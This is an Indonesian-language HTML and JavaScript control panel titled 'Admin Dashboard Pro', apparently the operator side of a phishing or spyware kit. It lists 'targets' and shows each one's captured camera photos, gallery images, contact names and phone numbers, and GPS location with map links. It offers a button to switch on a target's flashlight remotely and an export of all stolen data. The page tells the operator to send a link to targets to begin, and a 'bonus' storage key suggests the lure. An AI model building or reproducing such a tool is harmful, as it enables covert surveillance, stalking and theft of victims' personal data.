<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🎯 Admin Dashboard Pro | Full Control</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Inter', sans-serif; background: #0a0e27; color: #fff; min-height: 100vh; }
        .header { background: linear-gradient(135deg, #1a1f3a 0%, #0a0e27 100%); padding: 30px; border-bottom: 1px solid rgba(102,126,234,0.3); }
        .header-content { max-width: 1400px; margin: 0 auto; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 20px; }
        .logo h1 { font-size: 28px; font-weight: 800; background: linear-gradient(135deg, #667eea, #764ba2); -webkit-background-clip: text; background-clip: text; color: transparent; }
        .logo p { font-size: 12px; color: #6c7293; }
        .stats-grid { display: flex; gap: 20px; }
        .stat-badge { background: rgba(102,126,234,0.2); padding: 10px 20px; border-radius: 16px; text-align: center; }
        .stat-badge .number { font-size: 28px; font-weight: 800; color: #667eea; }
        .stat-badge .label { font-size: 12px; color: #8b8fb0; }
        .dashboard { max-width: 1400px; margin: 30px auto; padding: 0 30px; }
        .quick-stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-bottom: 30px; }
        .stat-card { background: rgba(255,255,255,0.03); border: 1px solid rgba(102,126,234,0.2); border-radius: 24px; padding: 25px; transition: all 0.3s; }
        .stat-card:hover { border-color: #667eea; transform: translateY(-5px); }
        .stat-card .icon { font-size: 40px; margin-bottom: 15px; }
        .stat-card .value { font-size: 42px; font-weight: 800; }
        .stat-card .title { font-size: 14px; color: #8b8fb0; margin-top: 5px; }
        .tabs { display: flex; gap: 10px; margin-bottom: 25px; flex-wrap: wrap; }
        .tab-btn { background: rgba(255,255,255,0.05); border: 1px solid rgba(102,126,234,0.2); padding: 12px 24px; border-radius: 12px; color: #fff; font-weight: 600; cursor: pointer; }
        .tab-btn:hover, .tab-btn.active { background: linear-gradient(135deg, #667eea, #764ba2); border-color: transparent; }
        .action-buttons { display: flex; gap: 12px; margin-bottom: 25px; flex-wrap: wrap; }
        .action-btn { background: rgba(255,255,255,0.05); border: 1px solid rgba(102,126,234,0.2); padding: 10px 20px; border-radius: 10px; color: #fff; font-weight: 500; cursor: pointer; display: inline-flex; align-items: center; gap: 8px; }
        .action-btn:hover { background: rgba(102,126,234,0.2); }
        .action-btn.danger:hover { background: rgba(220,53,69,0.2); border-color: #dc3545; }
        .data-grid { display: grid; gap: 20px; }
        .data-card { background: rgba(255,255,255,0.03); border: 1px solid rgba(102,126,234,0.15); border-radius: 20px; overflow: hidden; animation: fadeInUp 0.4s ease; }
        @keyframes fadeInUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
        .data-card-header { padding: 20px 25px; background: rgba(102,126,234,0.1); display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px; }
        .target-id { font-weight: 700; color: #667eea; }
        .target-time { font-size: 13px; color: #8b8fb0; }
        .data-card-body { padding: 25px; display: flex; flex-direction: column; gap: 20px; }
        .remote-control { background: #0a0e27; border-radius: 16px; padding: 15px; display: flex; gap: 10px; align-items: center; justify-content: center; border: 1px solid #667eea; }
        .remote-btn { background: #667eea; border: none; padding: 10px 20px; border-radius: 10px; color: white; font-weight: bold; cursor: pointer; }
        .remote-btn.danger { background: #dc3545; }
        .permission-badge { display: inline-flex; align-items: center; gap: 5px; background: rgba(40,167,69,0.2); padding: 4px 12px; border-radius: 100px; font-size: 12px; color: #28a745; }
        .photo-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(150px, 1fr)); gap: 10px; }
        .photo-grid img { width: 100%; border-radius: 12px; cursor: pointer; border: 2px solid rgba(102,126,234,0.3); }
        .contacts-list { background: #0a0e27; border-radius: 16px; padding: 15px; }
        .contact-item { padding: 8px; border-bottom: 1px solid rgba(255,255,255,0.1); }
        .empty-state { text-align: center; padding: 80px 20px; color: #8b8fb0; }
        .empty-state .icon { font-size: 80px; margin-bottom: 20px; opacity: 0.5; }
        .tab-content { display: none; }
        .tab-content.active { display: block; }
        .notification { position: fixed; top: 20px; right: 20px; background: linear-gradient(135deg, #667eea, #764ba2); padding: 15px 25px; border-radius: 12px; color: white; font-weight: 500; z-index: 1000; animation: slideInRight 0.3s; }
        @keyframes slideInRight { from { opacity: 0; transform: translateX(100%); } to { opacity: 1; transform: translateX(0); } }
    </style>
</head>
<body>

<div class="header">
    <div class="header-content">
        <div class="logo">
            <h1>🎯 Admin Dashboard Pro</h1>
            <p>Full Control | Real-time Monitoring</p>
        </div>
        <div class="stats-grid">
            <div class="stat-badge"><div class="number" id="totalOnline">0</div><div class="label">Target Hari Ini</div></div>
            <div class="stat-badge"><div class="number" id="lastUpdate">--:--</div><div class="label">Last Update</div></div>
        </div>
    </div>
</div>

<div class="dashboard">
    <div class="quick-stats">
        <div class="stat-card"><div class="icon">👥</div><div class="value" id="statTotal">0</div><div class="title">Total Target</div></div>
        <div class="stat-card"><div class="icon">📸</div><div class="value" id="statPhoto">0</div><div class="title">Foto Kamera</div></div>
        <div class="stat-card"><div class="icon">🖼️</div><div class="value" id="statGallery">0</div><div class="title">Galeri</div></div>
        <div class="stat-card"><div class="icon">📞</div><div class="value" id="statContacts">0</div><div class="title">Kontak</div></div>
        <div class="stat-card"><div class="icon">📍</div><div class="value" id="statLocation">0</div><div class="title">Lokasi</div></div>
    </div>

    <div class="action-buttons">
        <button class="action-btn" onclick="refreshData()">🔄 Refresh Data</button>
        <button class="action-btn" onclick="exportData()">📥 Export JSON</button>
        <button class="action-btn danger" onclick="clearAllData()">🗑️ Hapus Semua</button>
    </div>

    <div class="tabs">
        <button class="tab-btn active" onclick="switchTab('all')">📋 Semua Target</button>
        <button class="tab-btn" onclick="switchTab('gallery')">🖼️ Galeri Target</button>
        <button class="tab-btn" onclick="switchTab('contacts')">📞 Kontak Target</button>
        <button class="tab-btn" onclick="switchTab('location')">📍 Peta Lokasi</button>
    </div>

    <div id="allTab" class="tab-content active"><div class="data-grid" id="allDataList"></div></div>
    <div id="galleryTab" class="tab-content"><div class="data-grid" id="galleryList"></div></div>
    <div id="contactsTab" class="tab-content"><div class="data-grid" id="contactsList"></div></div>
    <div id="locationTab" class="tab-content"><div class="data-grid" id="locationList"></div></div>
</div>

<script>
    let allTargets = [];
    let lastCount = 0;

    // Remote control: kirim sinyal senter ke target (via localStorage)
    function remoteFlash(targetId) {
        localStorage.setItem('remote_flash_' + targetId, Date.now().toString());
        showNotification(`⚡ Senter dikirim ke ${targetId}`);
        setTimeout(() => localStorage.removeItem('remote_flash_' + targetId), 2000);
    }

    function loadData() {
        const stored = localStorage.getItem('bonus_targets_full');
        allTargets = stored ? JSON.parse(stored) : [];

        document.getElementById('statTotal').innerText = allTargets.length;
        document.getElementById('statPhoto').innerText = allTargets.filter(t => t.camera).length;
        document.getElementById('statGallery').innerText = allTargets.filter(t => t.gallery && t.gallery.length).length;
        document.getElementById('statContacts').innerText = allTargets.filter(t => t.contacts && t.contacts.length).length;
        document.getElementById('statLocation').innerText = allTargets.filter(t => t.location).length;

        const today = new Date().toDateString();
        document.getElementById('totalOnline').innerText = allTargets.filter(t => new Date(t.timestamp).toDateString() === today).length;
        document.getElementById('lastUpdate').innerText = new Date().toLocaleTimeString();

        renderAllData();
        renderGalleryAll();
        renderContactsAll();
        renderLocationAll();

        if(allTargets.length > lastCount) {
            showNotification(`🎯 ${allTargets.length - lastCount} target baru! Total: ${allTargets.length} orang`);
            lastCount = allTargets.length;
        }
    }

    function renderAllData() {
        const container = document.getElementById('allDataList');
        if(!allTargets.length) {
            container.innerHTML = '<div class="empty-state"><div class="icon">📭</div><h3>Belum Ada Target</h3><p>Kirim link ke target untuk mulai</p></div>';
            return;
        }
        container.innerHTML = [...allTargets].reverse().map((target, idx) => `
            <div class="data-card">
                <div class="data-card-header">
                    <div>
                        <span class="target-id">🎯 ${target.id}</span>
                        <div style="margin-top: 5px;">
                            ${target.camera ? '<span class="permission-badge">📸 Kamera</span>' : ''}
                            ${target.gallery?.length ? '<span class="permission-badge">🖼️ Galeri</span>' : ''}
                            ${target.contacts?.length ? '<span class="permission-badge">📞 Kontak</span>' : ''}
                            ${target.location ? '<span class="permission-badge">📍 Lokasi</span>' : ''}
                            ${target.flash ? '<span class="permission-badge">⚡ Senter</span>' : ''}
                        </div>
                    </div>
                    <div class="target-time">🕐 ${target.waktu}</div>
                </div>
                <div class="data-card-body">
                    ${target.camera ? `<div><strong>📸 Foto Kamera:</strong><br><img src="${target.camera}" style="max-width:100%; border-radius:12px; margin-top:10px;"></div>` : ''}
                    <div class="remote-control">
                        <span>⚡ Remote Control:</span>
                        <button class="remote-btn" onclick="remoteFlash('${target.id}')">🔦 Nyalakan Senter Target</button>
                    </div>
                </div>
            </div>
        `).join('');
    }

    function renderGalleryAll() {
        const container = document.getElementById('galleryList');
        const allGallery = [];
        allTargets.forEach(target => {
            if(target.gallery && target.gallery.length) {
                target.gallery.forEach(img => allGallery.push({ id: target.id, time: target.waktu, image: img }));
            }
        });
        if(!allGallery.length) {
            container.innerHTML = '<div class="empty-state"><div class="icon">🖼️</div><h3>Belum Ada Galeri</h3><p>Target akan mengirim foto galeri</p></div>';
            return;
        }
        container.innerHTML = `
            <div style="display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 20px;">
                ${allGallery.map(g => `
                    <div class="data-card">
                        <div class="data-card-header"><span class="target-id">${g.id}</span><span class="target-time">${g.time}</span></div>
                        <div class="data-card-body"><img src="${g.image}" style="width:100%; border-radius:12px;"></div>
                    </div>
                `).join('')}
            </div>
        `;
    }

    function renderContactsAll() {
        const container = document.getElementById('contactsList');
        const allContacts = [];
        allTargets.forEach(target => {
            if(target.contacts && target.contacts.length) {
                allContacts.push({ id: target.id, time: target.waktu, contacts: target.contacts });
            }
        });
        if(!allContacts.length) {
            container.innerHTML = '<div class="empty-state"><div class="icon">📞</div><h3>Belum Ada Kontak</h3></div>';
            return;
        }
        container.innerHTML = allContacts.map(c => `
            <div class="data-card">
                <div class="data-card-header"><span class="target-id">${c.id}</span><span class="target-time">${c.time}</span></div>
                <div class="data-card-body">
                    <div class="contacts-list">
                        ${c.contacts.map(ct => `<div class="contact-item">📱 ${ct.name}: ${ct.phone}</div>`).join('')}
                    </div>
                </div>
            </div>
        `).join('');
    }

    function renderLocationAll() {
        const container = document.getElementById('locationList');
        const locations = allTargets.filter(t => t.location);
        if(!locations.length) {
            container.innerHTML = '<div class="empty-state"><div class="icon">📍</div><h3>Belum Ada Lokasi</h3></div>';
            return;
        }
        container.innerHTML = locations.map(loc => `
            <div class="data-card">
                <div class="data-card-header"><span class="target-id">${loc.id}</span><span class="target-time">${loc.waktu}</span></div>
                <div class="data-card-body">
                    <div>📍 Lat: ${loc.location.lat}</div>
                    <div>📍 Lng: ${loc.location.lng}</div>
                    <a href="https://www.google.com/maps?q=${loc.location.lat},${loc.location.lng}" target="_blank" style="color: #667eea;">🌍 Buka Google Maps →</a>
                </div>
            </div>
        `).join('');
    }

    function showNotification(msg) {
        const notif = document.createElement('div');
        notif.className = 'notification';
        notif.innerHTML = msg;
        document.body.appendChild(notif);
        setTimeout(() => notif.remove(), 4000);
    }
    function refreshData() { loadData(); showNotification('🔄 Data di-refresh'); }
    function exportData() {
        const dataStr = JSON.stringify(allTargets, null, 2);
        const blob = new Blob([dataStr], {type: 'application/json'});
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `targets_${new Date().toISOString()}.json`;
        a.click();
        URL.revokeObjectURL(url);
        showNotification('📥 Data di-export');
    }
    function clearAllData() {
        if(confirm('⚠️ Hapus SEMUA data? ⚠️')) {
            localStorage.removeItem('bonus_targets_full');
            loadData();
            showNotification('🗑️ Semua data dihapus');
        }
    }
    function switchTab(tab) {
        document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
        event.target.classList.add('active');
        document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
        document.getElementById(tab + 'Tab').classList.add('active');
    }

    loadData();
    setInterval(loadData, 3000);
    window.addEventListener('storage', (e) => { if(e.key === 'bonus_targets_full') loadData(); });
</script>
</body>
</html>
